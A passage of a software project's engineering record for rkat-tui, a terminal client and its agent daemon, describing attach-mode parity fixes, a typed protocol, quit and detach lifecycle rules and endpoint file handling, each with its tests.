# Evidence — rkat-tui, part 2

Earlier entries of the engineering record, in date order, moved out of
`docs/evidence.md` to keep each file small. Nothing is added here; new
entries go to `docs/evidence.md`, whose topic index covers these too.

## The attach client and daemon after the senior review (2026-11-09)

### Reports carry the link they were started on

`client::runner::Report` carried no link generation. A background switch
(`/new`, `/resume`, another client's switch, the re-render after a
truncated stream) reads the new conversation on the connection it started
on and reports the reopened stream id. When that report was queued before
the connection dropped and handled after the reattach, `adopted` installed
the dead connection's stream id on the new link, and `on_notification`
then dropped every orchestrator event as another stream's. The window is
narrow (the loss and the whole reattach must be handled before the queued
report) but nothing closed it.

Every report now travels with the link epoch of the runner when its task
started (`Reporter`; `link_epoch` counts the links made in `connected`).
A report of an earlier epoch is dropped when it names something of that
connection (`Switched`, `Rerendered`, `MobOpened`; `SessionNow` and
`SessionUnread` only clear their in-flight flag); the reattach read all of
it again. What does not depend on the connection (a turn's failure, the
model lists, the picker rows, helper backfills of durable events) is
applied as before. `Report::Notice` cleared `switching` for any notice;
it is `Report::SwitchRefused` now, the one report besides a switch's end
that ends a switch (a stale one only shows its notice: a switch started
on the new link goes on).

Tests: `client::runner::tests::{a_switch_read_on_a_lost_connection_is_not_installed_after_the_reattach,
only_a_refused_switch_ends_the_switch}` (unit tests on a runner with an
in-memory link: the race is not reproducible against a real daemon, whose
lost connection fails every call in flight).

### Attach-mode drift: prices, the `!` hint, unsent messages, `--resume`

The attach runner was built from a copy of the in-process runner and the
copy had drifted: it discarded the endpoints' prices and never sent a price
table (`/cost` showed `$?`), its `App` never heard `with_shell_confined`
(the `!` hint said "sandbox" under `--no-confinement`), it ignored
`Effect::SaveUnsent` and never showed `quit::unsent_notice`, and it
silently ignored `--resume`/`-c`. Now `AttachConfig` carries the
`PricingSetup` the in-process bootstrap builds (the runner pushes the
table at start, refreshes the community list in the background and adds
the endpoint prices when the model lists arrive); `client::build_app`
builds the attach `App` with the `!` shell's confinement; the attach
runner keeps the held messages and saves those the daemon did not admit
(`quit::save_unsent`, shared with the in-process shutdown; an admitted
steer is the daemon's and is not saved) and shows the unsent notice at
start; `client::check_args` refuses `--resume`/`-c` with
`TuiError::AttachResume` before anything else runs. The shared `build_app`
and workbench of both runners is the next step (review batch D).

Tests: `attach::{resume_and_continue_are_refused_in_attach_mode,
attach_mode_prices_the_cost_readout_and_says_the_shell_runs_as_you,
unsent_messages_are_saved_at_quit_and_announced_at_the_next_attach}`.

### The daemon's local surface has its project and decisions

`daemon::local::Local` held the project inputs and the consent surface as
`Option`s set by builder methods, and `serve::LocalMethods` had default
`connect`/`decide` methods for a daemon without decisions, with `None`
branches in the proxy (`client_id.unwrap_or(0)`, an `initialize` answered
without the decision methods). The one caller always set both, and a daemon
without pushed decisions is refused by every client since P3b. Now
`Local::new(LocalParts { .., project, decisions })` takes both, the trait
methods are required, and the proxy always registers the client and always
adds the decision methods to `initialize`. The proxy's unit test
(`serve::tests::a_slow_local_call_holds_back_no_other_line`) serves an
in-memory decision owner.

### The `rkat/*` wire is typed once (`daemon::protocol`)

The daemon built its answers with `json!`, the client probed them with
`.get("…")`, decision phases were string-matched (`"approved"`,
`"rejected"`), the engine method names were literals on both sides, and
the JSON-RPC error codes were declared three times (`local.rs`,
`decisions.rs`, `handshake.rs`) with error lines hand-built in `serve.rs`
and `decisions.rs`. `src/daemon/protocol.rs` now holds every method name
(the `rkat/*` ones, the decision methods, and the engine methods the client
calls and the daemon observes, under `protocol::engine`), the
application error codes (`UNAUTHORIZED`, `SWITCH_FAILED`, `SWITCH_BUSY`;
the standard ones are `meerkat_rpc::error`'s, `i32` as the engine has
them, and `ClientError`'s codes follow), the serde types of every
`rkat/*` request and answer, `DecideParams` (the closed `decision/decide`
a client sends, formerly `decisions::DecideRequest`) and `DecisionEnded`
(its phase a `WireDecisionPhase`). Answer lines are `RpcResponse`s
(`protocol::{result_line, error_line}`), request ids `RpcId`s. The engine
exports no method-name constants of its own besides `decision/decide`, so
the `engine` names are ours. `tests/daemon.rs` and the raw calls in
`tests/attach_*.rs` keep testing the wire as JSON.

Tests: `daemon::protocol::tests::{answer_lines_are_json_rpc_responses,
a_decide_naming_who_decided_is_refused_and_no_params_read_as_empty}`, and
the daemon and attach suites unchanged in meaning.

### One bounded call path in the attach runner

The attach runner had 21 `tokio::time::timeout(CALL_TIMEOUT|SWITCH_TIMEOUT, …)`
blocks, each with its own `Ok(Ok)`/`Ok(Err)`/`Err` triage and its own
"did not answer in time" text, and `trust_command`/`rule_command` were the
same function. Now `bounded(limit, call)` turns a call into
`Result<T, CallFailure>` (`NotAttached`, `TimedOut`, `Failed(ClientError)`),
`AttachRunner::call_local(method, params)` calls one of the daemon's
`rkat/*` methods through it, `outcome_command` serves `/rules`, `/trust`
and `/rules trust`, and `switch_and_adopt` is the one `/new`/`/resume`
path. Behaviour is unchanged; the texts of a failure now come from
`CallFailure`. The attach suites pin it unchanged in meaning.

### One rank for a turn's end

The in-process runner (`runner::merge`) and the attach runner
(`Turn::record`) each ranked a run's end (completion < unknown/pending <
interrupted < failed) and differed on a tie: in-process kept the earlier
failure, attach the later. `ui::TurnFailure::rank` and
`ui::merge_turn_end` are the one rule now: on a tie a failure keeps the
first (the first failure is the one shown, as `TurnFailure::Failed`'s doc
always said) and a completion the last (the follow-up run's text is the
answer). Test: `ui::tests::a_turn_end_keeps_the_first_failure_and_the_last_completion`.

### The orphan cap counts instead of summing

Events of a mob stream whose open had not answered yet were held up to
`ORPHANS_MAX` (2,000), but the check summed every held list on every
event, and events past the cap were dropped without a word. `Orphans`
keeps a running count, releases a stream's events in order when it
registers, and logs once per connection when it starts dropping. Test:
`client::runner::tests::orphans_are_counted_bounded_and_released`.

### A render from the start reads the snapshot's cursor, not the whole log

`adopt` (a switch, a re-render) and `establish` (an attach that cannot
resume its cursor) replayed the session's whole event log from sequence 0
(`events/list_since`, 500 a page) only to learn the last sequence and the
last `TurnCompleted`'s usage. `EventsSnapshotResult.cursor` (meerkat-contracts
0.9.11; the engine pairs it with the snapshot, `event_snapshot` in
`meerkat-rpc`'s session runtime) is that sequence, and the call was already
made for the model and provider: `remote::snapshot` returns all three. The
gauge's seed comes from `last_context_before`, the doubling-window search the
resumed attach already used (256 events back, doubling, 4,096 at most), so a
conversation whose last model call lies further back than that starts with
an unknown gauge until its next turn (it was read from the full log before).
`EventsListSinceResult.latest_cursor` exists too and is not needed here.
Tests: the attach suites (`conversations::the_token_counter_and_gauge_follow_the_conversation`,
`attach::the_client_reconnects_to_a_restarted_daemon`) unchanged.

### Steer delivery is attributed first in, first out (an engine ask)

**Superseded 2026-11-11** by "Steers are attributed by input id" (Meerkat
0.9.12 answers the admitted input).

The attach runner keeps the steers the daemon admitted in order and marks
the oldest delivered at each `BoundaryAppendApplied` (and the rest at a
follow-up run or the turn's end). With one client that is exact. With two
clients steering one turn, A's boundary can mark B's message delivered.
The boundary event names its input (`BoundaryAppendApplied.input_id`), but
`mob/member_send` answers no runtime input id (`MobMemberSendResult` carries
the member and, for a keyed send, a delivery id), so the client has nothing
to match it with. Nothing is lost (the agent gets every
steer); only the "delivered" mark can name the wrong message for a moment.
Recorded as an ask (`docs/mob-split.md`, ask 6) and as a limit in
`docs/manual.md`; no application-side workaround reads the engine's input
ids today.

### `Decisions::hold_request` has a typed error

`hold_request` returned `Result<_, String>`, flattening a serialization
error, the decision clock's and the decision contract's refusals into
text. It returns `daemon::decisions::HoldError` (`Render`, `Clock`,
`Contract`) now, like the typed errors of the approval engine; the desk
still logs it and denies the call (fail closed). `Principal::new`,
`Decisions::new` and the requester key still answer `String` (start-up
configuration errors shown once); they are left for a later pass.

### Every engine flag reaches the daemon, or is named as not forwarded

`client::launch::daemon_argv` re-serialises the parsed `Args` into the
daemon's argv by hand, with second copies of the `ValueEnum` names
(`--realm-backend`, `--confinement`); a flag missed there was silently not
forwarded. Forwarding the original argv minus the UI flags was considered
and not taken: the UI flags take optional values (`--resume [REF]`), `=`
forms and a positional prompt, so stripping them is its own parser, and
the tests build `Args` without an argv. Now the enum names come from clap
(`to_possible_value`), `launch::NOT_FORWARDED` names the arguments that
stay in the TUI (prompt, resume, continue, the mouse flags, attach, and the
workspace, which is made explicit), and
`client::launch::tests::every_engine_flag_reaches_the_daemon` walks every
argument of `Args::command()`, gives it alone (a non-default value where
clap lists them), and requires the daemon's parser to read it back as it
went in; an argument neither forwarded nor listed fails it (checked by
dropping `--isolated`).

### The `tui.toml` layers are read once at start

`bootstrap::attach_mode` resolved the workspace and loaded every
`tui.toml` layer to read one bool; the chosen host then resolved and
loaded them again (attach mode a third time, for the `!` shell). Besides
the waste, `--isolated` mints a fresh realm id on every resolve, so with
`attach = true` in a user `tui.toml` the attach runner ran on a different
throwaway realm than the one whose layers chose it. Now
`bootstrap::read_layers` returns `Layers { scope, layered, notices }`
once; `attach_mode(args, &layers)` is pure, and `runner::run`,
`client::run`/`configure_with`, `bootstrap_with`, `assemble`,
`user_shell` and `Daemon::start_with` take the `Layers`. Test:
`attach::attach_mode_runs_on_the_layers_read_at_start` (and
`attach::attach_mode_is_the_default_and_a_users_tui_toml_can_turn_it_off`).

### The workbench: what both runners do the same way

The attach runner was a copy of the in-process runner's side effects (the
`!` shell, `/remember`, `/memory`, `/export`, the price table and cost
record, the model lists and picker, unsent messages, the UI's
construction), and the copy had drifted (prices never pushed, the shell
hint, unsent messages). They now live once in `src/workbench/`
(`Workbench`, `build_app`); both runners route those effects to it and
keep only what differs: the turn machinery (completion handles in
process, the daemon's event stream in attach mode, deliberately not
unified), session lifecycle, and what a model switch does. The agent is
reached through one call, `AgentContext::append_system_context`,
implemented by `SessionHandle` and by the attach link (`Linked`, bounded
like every other daemon call). With the in-process runner due to go, the
trait is the seam that collapses to the attach link alone; the workbench
itself stays. `daemon` and `client` no longer import `crate::runner`
except `client` for `blocks_from_messages` (transcript rendering, left
for the runner's removal). Both runners read their `AppSetup` their own
way (runtime vs layers); the test that they agree for the same
configuration is `attach::both_runners_build_the_same_app_for_the_same_config`.

### `--user-config-root` and `--config-dir` stay two flags

The review asked whether one can be folded into the other. Neither
expresses the other. `--user-config-root` stands in for the home
directory: the engine's factory takes it as `user_config_root` (the
user-level `.rkat/` conventions: AGENTS.md, skills, hooks, `mcp.toml`),
the user `tui.toml` legacy notice and the user hook trust read it, and the
default config dir moves under it; that is what isolates the integration
tests from the developer's home. `--config-dir` moves only rkat-tui's own
files (rules, notes, history, trust record, caches) and is the way out of
`-w ~`, where the default config dir is the realm directory, without
touching the engine's conventions. Each flag's help now says what it moves
and what it leaves. Tests: `bootstrap::scope::tests::global_dirs_follow_flags`,
`a_config_dir_colliding_with_the_realm_dir_is_refused`.

### `tui.toml` is `crate::config`, not the approval engine's

`RulesFile` is the whole `tui.toml` (endpoints, pricing, thinking,
confinement, helpers, shell, ui, daemon, attach), yet it lived in
`approval/rules.rs`, so endpoints, pricing and thinking imported their
schema from the approval engine, the runner read the compaction policy
through `ApprovalEngine::settings()`, and the Ctrl+T checklist preference
was written by `ApprovalEngine::persist_checklist`. The schema
(`config/file.rs`), the layering and its notices (`config/layers.rs`) and
the realm file's writes (`config/persist.rs`) are now `src/config/`;
`approval/rules.rs` keeps the patterns, `Rule`, `RuleSet` and `RulesError`
(the file's read and write errors stay in that enum, so `ApprovalError`
is unchanged). The host trust record moved to `bootstrap/trust.rs`. Every
write of the realm file goes through `config::write_trusted`, which
records the written bytes in the trust record; the engine uses it for
rules and the mode, the runner for the checklist view. The bootstrap
hands the runner the compaction policy (`Runtime::compaction`), computed
from the layered `[auto]` settings as the attach runner already did. No
behaviour change; the layering tests moved to `config::tests`, the
pattern tests stay in `approval::rules::tests`.

### `@` mentions: the UI neither walks nor stats the workspace

`App::update` is documented as pure, but `refresh_menu` ran
`mentions::workspace_paths` (an `ignore` walk of up to 100k paths) on the
UI thread the first time an `@` word opened the menu, and every submitted
prompt was scanned with `scan_mentions` (a `stat` per mention) to print
the `+ N files` line, while the runner expanded the mentions again when
it sent the prompt; the two could disagree (a file changed in between, or
the size budget turned a block into a note). Now the menu asks the UI
loop for the listing (`LocalEffect::IndexPaths`, tagged with a
generation; the loop walks on `spawn_blocking` and answers with
`Msg::PathIndex`, and an answer to a request the menu no longer waits for
is dropped), and the `+ N files` and sealed-path lines come from the
expansion itself: `Workbench::expand_mentions`, which both runners call
as they send a prompt or a steer, reports `Msg::Mentions` with what was
attached. The listing is a loop effect rather than an integrator one
because it needs nothing from the session and the in-process runner is
going away. Tests:
`ui::tests::the_path_listing_is_asked_for_once_and_a_stale_answer_is_dropped`,
`ui::tests::the_runners_mention_report_notes_what_was_attached_and_what_is_sealed`,
`client_turns::an_at_mention_attaches_the_file_the_session_receives`.

### The task checklist in attach mode (`rkat/tasks`)

The attach runner dropped `Effect::SetChecklistView` and never showed a
checklist: the in-process runner reads the engine's task store
(`tasks.db`) itself. The reader moved to `workbench::tasks`
(`read_tasks`, `read_checklist`, `changes_tasks`) and the daemon answers
`rkat/tasks {"session_id"}` with the store's tasks; the client turns them
into the checklist as in-process (on attach, after a conversation switch,
after each `task_create`/`task_update` the orchestrator completes) and
drops a list read for a conversation it has left since. The view is not
written by the client: the realm `tui.toml` and the trust record it is
recorded in are the daemon's (a write the record does not know would make
the daemon's next start apply only the file's deny rules), so the client
asks `rkat/checklist_view` and the daemon writes through
`ApprovalEngine::persist_checklist_view`, as it persists the mode. Test:
`attach::the_task_tools_fill_the_checklist_over_the_daemon`.

### Input history in attach mode (verified, no gap)

↑/↓ recall and Ctrl+R search come from the UI's histories, which both
runners load through one function, `workbench::app::load_histories` (the
realm's `tui_history` and the user's global history file), and the UI loop
appends every submitted line to each; the attach config's scope names the
same files as the in-process runtime's. Nothing was missing; the test that
pins it is `attach::attach_mode_recalls_and_searches_the_shared_input_history`.

### `/model` in attach mode switches in place (`rkat/set_model`)

The attach client sent a `/model` switch as per-turn overrides on the next
prompt's `mob/turn_start`, which is request-scoped: detaching during that
one turn cancelled it (a documented limit). The in-process switch has not
rebuilt the session since ba5ca65; it calls the runtime's
`SessionServiceRuntimeExt::reconfigure_session_llm_identity` on the live
session. Probe: the daemon's `MobMcpState` is built on the same
`MeerkatMachine` (`SessionRuntime::runtime_adapter()`), and the same call on
the orchestrator member's bridge session is accepted and persisted: the
next `mob/member_send` runs on the new model, from any connection, and a
client attaching later reads the new identity. So `rkat/set_model`
(`daemon::local::Local::set_model`) does that, with the endpoint's auth
binding and the `[thinking]` setting resolved as the `turn_start` path
resolved them, under the conversation switch lock and refused with
`SWITCH_BUSY` while the orchestrator's run is open (the in-process switch
refuses during a turn too). The client calls it at once and no longer
holds a pending switch; its own `/new` re-applies the last switch the same
way. The limit is gone from the manual. Tests:
`attach::model_switches_in_place_and_stays`,
`attach::a_model_switch_waits_for_the_turn`,
`daemon::set_model_switches_in_place_and_waits_for_the_run`.

### `/context` in attach mode

The attach runner answered `/context` with the gauge and "not available in
attach mode yet". The breakdown (`context_breakdown`, the instruction file
list) moved from `runner::context` to `workbench::context`; the attach
runner reads the messages with the existing `rkat/transcript` and finds the
instruction files with `InstructionSources::of(scope)`, which the daemon's
builds and the in-process runtime now also use, so both name the same
files. What neither knows is the engine's own tool count; the attach line
names rkat-tui's tools without a count (the daemon's orchestrator has no
`fork`). Test: `attach::context_reports_the_daemons_conversation`.

### File diffs in attach mode (`rkat/file_diff`)

Found while comparing the two runners' tool sets for P1: the in-process
runner builds its `FileToolDispatcher` with a diff channel and shows each
change as a `Msg::Diff`; the daemon built the orchestrator's with `None`,
so attach mode showed no diffs at all (the plan did not list it). The
daemon's file tools now report to a channel, and
`Decisions::forward_diffs` pushes each change to every attached client as
an `rkat/file_diff` notification (`protocol::FileDiffNote`), which the
attach runner turns into the same `Msg::Diff`. Diffs are a view, not
durable: a client that attaches later sees the tool calls only, as a
resumed in-process conversation does. Helpers' file tools report no diffs
in either mode. Test: `attach::the_agents_file_changes_show_as_diffs`.

### The daemon's start-up notices reach the clients (`rkat/notices`)

Found under P1 item 6: the in-process runner shows the confinement's
observations and the rules' and bootstrap's warnings at start; the daemon
composed the same `Assembled` and dropped them (`..` in `engine::compose`),
so an attached user never learned that the shell runs unconfined, that a
rules file was not applied or that semantic memory is off. The daemon now
keeps them in order (`Composed::startup_notices`) and answers
`rkat/notices`; the attach runner shows them when it attaches to a daemon
it has not shown yet (the first attach, or one that restarted: the daemon
id the cursor keeps). Test:
`attach::the_daemons_start_up_notices_show_on_attach`.

### P1 parity: what stays an engine limit, and the texts

Every `Effect` the attach runner receives now does what the in-process one
does, except two, both engine limits: `/rewind` (the engine refuses
`session/fork_at` for a mob member's session; lukacf/meerkat#2126) and
taking back a sent message (Up on an empty input: `mob/member_send`
answers no input id to cancel by, the same gap as ask 6's steer
attribution). The attach runner names the latter with `RECALL_UNAVAILABLE`
instead of the generic "not available yet"; the manual lists both. The
agent's tool set was compared with the in-process session's: the daemon's
orchestrator has the same file and note tools and the same denied builtins
(`brain_swap`, `apply_patch`, through `mobs::customizer::shape_root`), and
`fork_off` behind the gate instead of the TUI's `fork`; no system prompt
text names `fork` (the tool describes itself, and the daemon does not
register it). The quit texts said "quit" where attach mode detaches: the
editor title follows the status bar's attach state. Tests:
`render::a_first_idle_ctrl_d_asks_for_a_second_in_the_editor_title`,
`attach::what_the_daemon_cannot_do_yet_says_so`.

### The daemon's lifecycle state and its owner (`rkat/status`)

P2 of the always-daemon plan needs the daemon to know who may stop it.
`daemon::lifecycle::Lifecycle` counts the attached connections (a
`Seat` per connection, released when it ends), keeps a `detached` flag
that is never reset, and holds the start token. The owner is decided by
a token, not by a connection id: the client that launches the daemon
draws a token (`endpoint::new_token`), hands it over in
`RKAT_TUI_START_TOKEN` (the environment, not the command line, which
`/proc/<pid>/cmdline` shows to every local user; the agent's confined
shell gets a curated environment without it) and presents it in every
`rkat/attach` (`AttachParams::start_token`). A daemon started by hand
has none, and a daemon a client restarts after it died is started
without one: it lost what it knew about its clients, so it has no owner
and `/quit` asks. The token grants nothing on its own: attaching still
needs the endpoint token; holding both only means "stop without asking".
`AttachParams`' `Debug` prints neither token. A `probe` attach (for
`--list`) is not counted as a client, so listing never turns a `/quit`
that would stop the daemon into a detach. `rkat/status` counts the
caller among `clients`. `rkat/shutdown` resolves the same shutdown path
as SIGTERM (`Lifecycle::shutdown_requested` is selected with the signal
in `Daemon::serve_until`), so the endpoint file goes first; once a
shutdown began, connections ending are no detach. Hangup is detach: the
owner's `Seat` dropping without a shutdown sets `detached`, any other
connection's does not. Tests: `lifecycle::status_reports_the_daemon_its_clients_and_the_owner`,
`lifecycle::a_dropped_owner_connection_is_a_detach_and_the_daemon_keeps_running`,
`lifecycle::detach_is_recorded_and_never_reset`,
`lifecycle::shutdown_stops_the_daemon_and_removes_its_endpoint_file`,
`daemon::lifecycle::tests::*`,
`client::launch::tests::the_start_token_is_handed_over_in_the_environment`.

### `/quit`, `/detach` and hangup in attach mode

The UI cannot leave first and decide later: `Effect::Quit` ends the UI
loop at once. So an attached `/quit` (and Ctrl-D, and Ctrl-C twice, which
now take the same path) sends `Effect::DecideQuit`; the attach runner
reads `rkat/status` (bounded by 3 s) and answers `Msg::QuitDecided`
(`client::runner::quit_decision`): more than one client attached →
leave, the daemon stays for the others (a notice says so); the owner, no
detach → terminate; anything else, including a status that failed →
`Modal::Quit` (detach highlighted; it says a running turn is
interrupted). Only then does the UI send `SaveUnsent`, `Effect::Leave`
(`rkat/detach` or `rkat/shutdown`) and `Effect::Quit`, so the unsent
messages are saved whichever way it leaves and the quit-confirm for a
busy UI still comes first. A second `/quit` while the runner decides
leaves at once as a detach (an escape if the daemon hangs). Leaving the
others' daemon sends no `rkat/detach`: a non-owner leaving is not "keep
going without me"; the owner's connection ending is recorded as a
detach by the daemon anyway. A daemon without `rkat/shutdown` gets
SIGTERM, as `/daemon stop`. What the runner did is printed on the
terminal after the UI closes (`AttachRunner::farewells`), since the
transcript is gone by then. SIGHUP is forwarded as `Msg::Hangup`, which
leaves like a detach with no message to the daemon, so the terminal is
restored and the daemon keeps running. Tests:
`lifecycle::quit_stops_the_daemon_this_client_started`,
`lifecycle::detach_keeps_the_daemon_and_a_later_quit_asks`,
`lifecycle::quit_with_another_client_attached_leaves_the_daemon_to_it`,
`lifecycle::a_client_that_did_not_start_the_daemon_is_asked`,
`lifecycle::the_owner_hanging_up_keeps_the_daemon`,
`lifecycle::the_quit_decision_follows_the_rules`,
`ui::tests::dispatch::an_attached_quit_asks_the_runner_and_follows_its_decision`,
`ui::tests::dispatch::the_quit_dialog_detaches_by_default_terminates_on_request_and_esc_stays`,
`ui::tests::dispatch::unsent_messages_are_saved_whichever_way_an_attached_quit_leaves`,
`client::tests::a_hangup_reaches_the_ui`.

### Bug class: a negative observation taken as positive evidence

Every maintainer finding on the attach lifecycle on 2026-11-09 was the
same mistake: something not observed (an answer that did not come, a
file that could not be read, a connect that did not succeed, a name that
matched) was read as proof of a verdict. The instances and their fixes:

- a dropped connection during `rkat/shutdown` reported as "stopped" (7fe22c8);
- an unreadable or malformed endpoint file taken as "daemon gone" (28a10c2);
- a connect timeout treated as a refusal (fc6d35f);
- a client acknowledged before it was counted (3faa351);
- a refused local port through a tunnel taken as a stopped daemon (8094359);
- a matching host name plus an existing path taken as "local" (b2252c2);
- a token file's group permission bits not checked (126240b).

The rule for future changes: a "stopped", "gone", "local" or "delivered"
verdict needs positive evidence; an outcome that cannot be observed stays
unknown and is reported as such; and the negative case gets its own test.

### `--list` (`daemon::list`)

`rkat-tui --list` and `rkat-tui-mob --list` share `daemon::list`: every
`mob.endpoint` one level under the search directories
(`endpoint::search_dirs`), or the one `--endpoint-file` names
(`rkat-tui-mob` only), is probed by attaching as a probe (not counted as
a client, so listing never changes what a `/quit` decides) and reading
`rkat/status`. A file whose address does not accept is stale; it is
removed only when its pid is gone (`kill(pid, 0)` reports `ESRCH`), so a
daemon that is alive but slow keeps its file. A daemon that accepts but
answers no status (an older one) is listed as live without the status
columns. Lines are tab-separated in a fixed order (workspace, address,
pid, uptime, clients, conversation, running or idle), with no header, so
they cut and sort; the token is never printed. `--list` is handled
before the daemon's UI-flag check and is not forwarded to a started
daemon (`launch::NOT_FORWARDED`). Tests:
`lifecycle::list_shows_a_live_daemon_and_removes_a_stale_file`,
`daemon::list::tests::*`.

### A shutdown without an answer is not reported as done

Review finding on the `/quit` commit: `depart` took a `Disconnected`
from `rkat/shutdown` as success, but `Connection::call` also returns it
when the request was never written or the connection dropped before the
daemon read it, so a daemon still running was reported stopped (and the
SIGTERM fallback skipped). Now only an answer counts as stopped; no
answer (disconnected, timed out, not attached) is unknown until
`daemon_ended` sees the endpoint file no longer name this daemon (its
token) or its pid gone, polled for up to 5 s (`STOP_VERIFY`; the daemon
removes the file after draining its connections for up to 2 s). If it
does not, the farewell says the daemon may still be running and names
`--list`, `/daemon stop` and the pid. A refusal (a daemon without
`rkat/shutdown`) still falls back to SIGTERM. Test:
`client::runner::tests::a_shutdown_without_an_answer_is_reported_stopped_only_once_the_daemon_ended`
(the connection drops right after the attach, the file names a live
daemon: never "stopped"; next to it the case where the daemon ended),
and `lifecycle::quit_stops_the_daemon_this_client_started` for the
normal shutdown.

### Only a refused connect proves a stopped daemon

Maintainer review of 28a10c2: `daemon_ended` took any failed connect to
the daemon's address (`connect_timeout(..).is_ok()` false) as proof that
it ended, so a connect that timed out on a loaded host, or failed with a
local socket error, reported "stopped" while the endpoint file still
named the daemon and its pid was alive. The probe is now classified
(`client::runner::classify`, `Probe`): `ConnectionRefused` (and a reset,
which a loopback connect to a closed port can report) is evidence of a
stop; a timeout or any other error is `Unknown` and counts only when the
pid is gone or no endpoint file names the daemon's token any more. Test:
`client::runner::tests::only_a_refused_connect_counts_as_a_stopped_daemon`
(classifies constructed `io::Error`s, so it does not depend on host load).

### The endpoint file falls back to the runtime directory

When the agent shell's confinement would grant the state directory (a
workspace that contains `~/.local/state`, such as the home directory, or
an `XDG_STATE_HOME` inside a granted path), the daemon used to refuse to
start. It now tries the places of `endpoint::candidates` in order,
`<state>/rkat-tui/<key>/mob.endpoint` then
`$XDG_RUNTIME_DIR/rkat-tui/<key>/mob.endpoint` (0700/0600 as before), and
takes the first the plan does not grant (`daemon::choose_endpoint_file`);
when neither is safe, or the runtime directory is unset, the first
refusal stands with today's message. The temp dir was ruled out: it is
granted to the shell. The runtime directory is per user, mode 0700, on
tmpfs and cleared at logout, which suits a file that only lives as long
as the daemon. An explicit `--endpoint-file` is the only place tried.
Every daemon start checks both places for a live daemon first. Clients
resolve the same list (`AttachConfig::endpoint_files`) in the same
order: `launch::probe_any` takes the first live endpoint, else the first
stale one; a client starting the daemon no longer passes
`--endpoint-file` when it looks in the default places (the daemon
picks, the client waits at both); `--list` scans both directories;
`/quit`'s check that a daemon ended looks at both. Tests:
`daemon::tests::the_confined_shell_is_granted_nothing_that_holds_the_endpoint_file`
(the fallback is chosen when the first place is granted, the refusal
kept with one place), `client::launch::tests::the_decision_follows_the_endpoint_file`
(`probe_any`, `argv_for`), `daemon::an_endpoint_file_the_confined_shell_could_read_is_refused`.

A second review finding on that fix: `daemon_ended` read "no file names
the daemon" from `Endpoint::read(..).is_ok_and(..)`, which is also false
for a file that cannot be read or parsed, so a malformed endpoint file
made a live daemon count as stopped. Now only a file that is gone
(`NotFound`) or names another token is evidence; an unreadable or
malformed one is unknown, and the daemon counts as ended only when the
captured pid is gone or the captured address refuses connections
(`accepts`, a blocking loopback connect so the paused-clock test cannot
time it out). The test has four cases: the file still names the daemon,
the file removed, a malformed file with the daemon's address still
accepting (never "stopped"), and a malformed file with the address
closed.

### The default flip (P3): attach, else start

`rkat-tui` with neither `--attach` nor `--no-attach` and no `attach` key
in a user `tui.toml` now attaches (`bootstrap::attach_mode` returns
`Some(AttachMode::Auto)`); `attach = false` in a user layer, or
`--no-attach`, runs in-process, and the flags win over the file
(`Layered::attach` became an `Option<bool>` so an explicit `false` is
told apart from unset). The plan named the default mode
`IfRunningElseStart`; the code already had that mode under the name
`Auto` (`launch::decide`: a live endpoint attaches, an absent or stale
one starts the daemon), and a second variant with the same decision
would only have been a synonym, so the default is `Auto` and the docs
say so. The attach notice is informational now (`ATTACH_NOTICE`, one
sentence on what the daemon is) instead of the experimental warning.
Test: `attach::attach_mode_is_the_default_and_a_users_tui_toml_can_turn_it_off`.

### The command line's prompt waits for the first attach

Found while flipping the default: `app::open` submits the prompt
argument as the UI opens, so its `Effect::StartTurn` reached the attach
runner before the first connect finished, and `start_turn` failed it as
"not attached" (it had with `--attach "…"` since attach mode began; with
attach the default it would have hit every `rkat-tui "fix it"`). The
runner now holds `StartTurn` effects until the first link is up and no
start-up switch (item 3's `--resume <ref>`) runs, or the first connect
failed (then they fail as before, with the connect error shown). Test:
`attach::a_prompt_sent_before_the_attach_finished_is_held_until_it_did`
(fails without the hold).

### `-c` and `--resume` under attach; in-process sessions stay in-process

Batch C refused `-c` and `--resume` in attach mode
(`TuiError::AttachResume`). Now the first attach acts on them
(`client::StartAt`, applied in `AttachRunner::connected` on the first
link): `-c`, `--resume last`/`~`/`~0` and no flag attach to the daemon's
current conversation (with a daemon, the most recent conversation is the
one it runs; in-session `/resume last` keeps meaning the one before it);
`--resume` alone shows the picker; `--resume <ref>` runs the same switch
as `/resume <ref>` (`sessions::resolve` against `rkat/conversations`,
then `rkat/resume`), and the command line's prompt is held until the
switch ended (the hold of the entry above), so it lands in the resumed
conversation.

Probe: can the daemon seat its member on a session the in-process TUI
created? An in-process runner (`Rig`) ran one turn and quit; the session
was written into the daemon's `conversations.json` so that the daemon's
own check (`SwitchError::Unknown`) let it through; a daemon started on
the workspace was asked `rkat/resume` for it. The engine refused:
`seating the orchestrator: internal error: missing durable comms_name
for resumed mob member` (`MemberLaunchMode::Resume` needs the member
binding a mob spawn records with the session; a plain runtime-backed
session has none), and the daemon seated the member back on its previous
conversation. Decision: no adoption now. A one-time adoption would have
to copy the transcript into a fresh member session, which the engine
offers no route for (mob-owned transcripts cannot be edited, see the
`/rewind` entry), so such sessions keep the in-process path until P4
decides their migration; `--resume <ref>` and `/resume <ref>` that match
no daemon conversation say so and name `rkat-tui --no-attach --resume
<ref>` (`sessions::not_a_daemon_conversation`). Tests:
`conversations::resume_and_continue_choose_the_conversation_at_attach`,
`conversations::an_in_process_session_cannot_be_seated_on_the_member`
(pins the engine's refusal and the member staying where it was),
`client::tests::the_start_flags_choose_the_first_conversation`.

### `--no-attach` beside a live daemon

`lib.rs` routes an in-process start through `in_process`: it probes the
workspace's endpoint places (`client::alongside::find`, the `--list`
probe: a probe attach, then `rkat/status`), and when a daemon answers it
asks before the TUI opens (`ui::ask_alongside`, a dialog drawn with the
modal box on its own terminal session, so nothing is added to the
in-process runner that P4 deletes) or, with a prompt on the command line
or no terminal, adds a one-line notice to the layers' start-up notices.
"Stop the daemon" sends `rkat/shutdown` and waits for `daemon_ended`.
`--no-attach -c` on the daemon's conversation: the engine refuses with
`TuiError::Materialize(RuntimeBindings(Hosting(_,
SessionError::ServedElsewhere { id })))` (the hosting refusal is a
field, not a `source`, so `alongside::served_elsewhere` matches the
variants instead of walking sources); when `id` is the daemon's current
session `alongside::explain` replaces it with
`TuiError::RunningInDaemon`. A session the daemon does not run keeps the
engine's error. Tests:
`lifecycle::no_attach_beside_a_live_daemon_says_so_and_explains_its_conversation`
(find, describe, notice, the real engine refusal turned plain, stop),
`ui::modal::tests::the_alongside_dialog_offers_attach_alongside_and_stop`.

### `--attach` values and `--attach=DIRECTORY`

`--attach` takes `cli::AttachTarget` (`cli::parse_attach`): `auto`,
`existing`, a directory when the value holds a `/` or starts with `.` or
`~` (`~` expanded to the home directory), else `HOST:PORT` (a non-empty
